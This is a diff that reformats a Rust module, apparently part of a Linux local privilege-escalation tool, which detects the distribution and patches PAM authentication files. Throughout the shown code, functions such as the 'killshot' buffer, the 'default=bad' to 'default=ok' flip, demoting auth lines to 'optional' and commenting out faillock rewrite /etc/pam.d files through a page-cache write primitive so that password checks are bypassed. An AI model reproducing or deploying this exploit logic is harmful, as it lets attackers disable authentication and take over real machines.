@@ -43,8 +43,8 @@ impl From<PamError> for Error {
     }
 }
 
-const FILE_BUF: usize = 4096;       // PAM target file (common-auth ~600B, system-auth ~2KB)
-const OS_RELEASE_BUF: usize = 2048;  // /etc/os-release (typical ~500B)
+const FILE_BUF: usize = 4096; // PAM target file (common-auth ~600B, system-auth ~2KB)
+const OS_RELEASE_BUF: usize = 2048; // /etc/os-release (typical ~500B)
 const OS_RELEASE_PATH: &[u8] = b"/etc/os-release\0";
 
 const DEBIAN_TARGET: &[u8] = b"/etc/pam.d/common-auth\0";
@@ -61,13 +61,18 @@ pub fn parse_distro_family(os_release: &[u8]) -> DistroFamily {
     let id = scan_kv(os_release, b"ID");
     let id_like = scan_kv(os_release, b"ID_LIKE");
 
-    if matches_token(id, b"debian") || matches_token(id, b"ubuntu")
-        || matches_token(id_like, b"debian") || matches_token(id_like, b"ubuntu")
+    if matches_token(id, b"debian")
+        || matches_token(id, b"ubuntu")
+        || matches_token(id_like, b"debian")
+        || matches_token(id_like, b"ubuntu")
     {
         return DistroFamily::DebianUbuntu;
     }
-    if matches_token(id, b"fedora") || matches_token(id, b"rhel") || matches_token(id, b"centos")
-        || matches_token(id_like, b"fedora") || matches_token(id_like, b"rhel")
+    if matches_token(id, b"fedora")
+        || matches_token(id, b"rhel")
+        || matches_token(id, b"centos")
+        || matches_token(id_like, b"fedora")
+        || matches_token(id_like, b"rhel")
     {
         return DistroFamily::FedoraRhel;
     }
@@ -89,8 +94,12 @@ fn scan_kv<'a>(body: &'a [u8], key: &[u8]) -> &'a [u8] {
         let line = &body[line_start..line_end];
         if line.len() > key.len() && line.starts_with(key) && line[key.len()] == b'=' {
             let mut v = &line[key.len() + 1..];
-            if !v.is_empty() && v[0] == b'"' { v = &v[1..]; }
-            if !v.is_empty() && v[v.len() - 1] == b'"' { v = &v[..v.len() - 1]; }
+            if !v.is_empty() && v[0] == b'"' {
+                v = &v[1..];
+            }
+            if !v.is_empty() && v[v.len() - 1] == b'"' {
+                v = &v[..v.len() - 1];
+            }
             return v;
         }
         i = line_end + 1;
@@ -106,9 +115,13 @@ fn matches_token(value: &[u8], tok: &[u8]) -> bool {
     let mut i = 0;
     while i < value.len() {
         // Skip whitespace.
-        while i < value.len() && (value[i] == b' ' || value[i] == b'\t') { i += 1; }
+        while i < value.len() && (value[i] == b' ' || value[i] == b'\t') {
+            i += 1;
+        }
         let start = i;
-        while i < value.len() && value[i] != b' ' && value[i] != b'\t' { i += 1; }
+        while i < value.len() && value[i] != b' ' && value[i] != b'\t' {
+            i += 1;
+        }
         if &value[start..i] == tok {
             return true;
         }
@@ -180,7 +193,9 @@ where
         };
         let raw = &content[line_start..line_end];
         let mut j = 0;
-        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') { j += 1; }
+        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') {
+            j += 1;
+        }
         let token_off = line_start + j;
         let rest = &raw[j..];
         if !rest.is_empty() && rest[0] != b'#' && rest.starts_with(b"auth") {
@@ -197,7 +212,9 @@ where
 }
 
 fn line_contains(line: &[u8], needle: &[u8]) -> bool {
-    if needle.len() > line.len() { return false; }
+    if needle.len() > line.len() {
+        return false;
+    }
     line.windows(needle.len()).any(|w| w == needle)
 }
 
@@ -218,7 +235,9 @@ pub fn find_pam_deny_killshot_offset(content: &[u8]) -> Option<usize> {
         };
         let raw = &content[line_start..line_end];
         let mut j = 0;
-        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') { j += 1; }
+        while j < raw.len() && (raw[j] == b' ' || raw[j] == b'\t') {
+            j += 1;
+        }
         let token_off = line_start + j;
         let rest = &raw[j..];
         if rest.len() > 4 && &rest[..4] == b"#aut" {
@@ -244,7 +263,11 @@ pub fn find_pam_deny_killshot_offset(content: &[u8]) -> Option<usize> {
 // Copy `original` into `out`, apply mutation, pad length to multiple of 4.
 // Length is `min_len` rounded up to multiple of 4, capped to original.len()
 // rounded up. Returns the actual length used.
-fn build_patched(original: &[u8], out: &mut [u8], mutations: &[(usize, &[u8])]) -> Result<usize, PamError> {
+fn build_patched(
+    original: &[u8],
+    out: &mut [u8],
+    mutations: &[(usize, &[u8])],
+) -> Result<usize, PamError> {
     // Determine end offset (max mutation end).
     let mut end = 0usize;
     for &(off, bytes) in mutations {
@@ -273,11 +296,19 @@ fn build_patched(original: &[u8], out: &mut [u8], mutations: &[(usize, &[u8])]) 
     Ok(n)
 }
 
-pub fn build_killshot_buf(original: &[u8], offset: usize, out: &mut [u8]) -> Result<usize, PamError> {
+pub fn build_killshot_buf(
+    original: &[u8],
+    offset: usize,
+    out: &mut [u8],
+) -> Result<usize, PamError> {
     build_patched(original, out, &[(offset, b"#aut")])
 }
 
-pub fn build_a1_buf(original: &[u8], line_offset: usize, out: &mut [u8]) -> Result<usize, PamError> {
+pub fn build_a1_buf(
+    original: &[u8],
+    line_offset: usize,
+    out: &mut [u8],
+) -> Result<usize, PamError> {
     if line_offset >= original.len() {
         return Err(PamError::OffsetOutOfBounds);
     }
@@ -296,12 +327,20 @@ pub fn build_a1_buf(original: &[u8], line_offset: usize, out: &mut [u8]) -> Resu
     build_patched(original, out, &[(req_off, b"optional ")])
 }
 
-pub fn build_fedora_default_flip_buf(original: &[u8], offset: usize, out: &mut [u8]) -> Result<usize, PamError> {
+pub fn build_fedora_default_flip_buf(
+    original: &[u8],
+    offset: usize,
+    out: &mut [u8],
+) -> Result<usize, PamError> {
     // 'default=bad' (11 bytes) -> 'default=ok ' (11 bytes, trailing space).
     build_patched(original, out, &[(offset, b"default=ok ")])
 }
 
-pub fn build_fedora_faillock_comment_buf(original: &[u8], line_offset: usize, out: &mut [u8]) -> Result<usize, PamError> {
+pub fn build_fedora_faillock_comment_buf(
+    original: &[u8],
+    line_offset: usize,
+    out: &mut [u8],
+) -> Result<usize, PamError> {
     build_patched(original, out, &[(line_offset, b"#")])
 }
 
@@ -312,7 +351,9 @@ pub struct PamVector {
 }
 
 impl Default for PamVector {
-    fn default() -> Self { Self::new() }
+    fn default() -> Self {
+        Self::new()
+    }
 }
 
 impl PamVector {
@@ -347,11 +388,19 @@ impl PamVector {
 }
 
 impl Vector for PamVector {
-    fn name(&self) -> &'static str { "pam" }
+    fn name(&self) -> &'static str {
+        "pam"
+    }
 
     fn applicable(&self) -> Result<bool, Error> {
-        let target = match self.target_path() { Some(p) => p, None => return Ok(false) };
-        let permit = match self.permit_path() { Some(p) => p, None => return Ok(false) };
+        let target = match self.target_path() {
+            Some(p) => p,
+            None => return Ok(false),
+        };
+        let permit = match self.permit_path() {
+            Some(p) => p,
+            None => return Ok(false),
+        };
 
         if !path_exists(permit) {
             return Ok(false);
@@ -414,7 +463,8 @@ impl Vector for PamVector {
                 // in same write_buffer call since write_buffer always copies
                 // byte-by-byte from offset 0).
                 let def_off = find_fedora_default_bad_offset(original).ok_or(Error::ParseError)?;
-                let fail_off = find_fedora_faillock_authfail_line_offset(original).ok_or(Error::ParseError)?;
+                let fail_off =
+                    find_fedora_faillock_authfail_line_offset(original).ok_or(Error::ParseError)?;
                 build_patched(
                     original,
                     &mut patched,
@@ -433,12 +483,18 @@ impl Vector for PamVector {
 
         // Prime cache: read full file (drains page-fault chain for the splice).
         let mut prime = [0u8; FILE_BUF];
-        unsafe { libc::lseek(fd, 0, libc::SEEK_SET); }
+        unsafe {
+            libc::lseek(fd, 0, libc::SEEK_SET);
+        }
         let _ = unsafe { libc::read(fd, prime.as_mut_ptr() as *mut _, prime.len()) };
-        unsafe { libc::lseek(fd, 0, libc::SEEK_SET); }
+        unsafe {
+            libc::lseek(fd, 0, libc::SEEK_SET);
+        }
 
         let result = primitive.write_buffer(fd, &patched[..patched_len]);
-        unsafe { close_fd(fd); }
+        unsafe {
+            close_fd(fd);
+        }
         result
     }
 }
@@ -447,20 +503,20 @@ impl Vector for PamVector {
 
 fn read_file_to_buf(path_z: &[u8], out: &mut [u8]) -> Option<usize> {
     let fd = unsafe { libc::open(path_z.as_ptr() as *const _, libc::O_RDONLY) };
-    if fd < 0 { return None; }
+    if fd < 0 {
+        return None;
+    }
     let mut total = 0usize;
     while total < out.len() {
-        let n = unsafe {
-            libc::read(
-                fd,
-                out.as_mut_ptr().add(total) as *mut _,
-                out.len() - total,
-            )
-        };
-        if n <= 0 { break; }
+        let n = unsafe { libc::read(fd, out.as_mut_ptr().add(total) as *mut _, out.len() - total) };
+        if n <= 0 {
+            break;
+        }
         total += n as usize;
     }
-    unsafe { close_fd(fd); }
+    unsafe {
+        close_fd(fd);
+    }
     Some(total)
 }
 
@@ -472,4 +528,6 @@ fn path_exists(path_z: &[u8]) -> bool {
 
 // Suppress unused-import warnings on hosts without all paths / consts.
 #[allow(dead_code)]
-fn _unused_ptr_ref() { let _ = ptr::null::<u8>(); }
+fn _unused_ptr_ref() {
+    let _ = ptr::null::<u8>();
+}
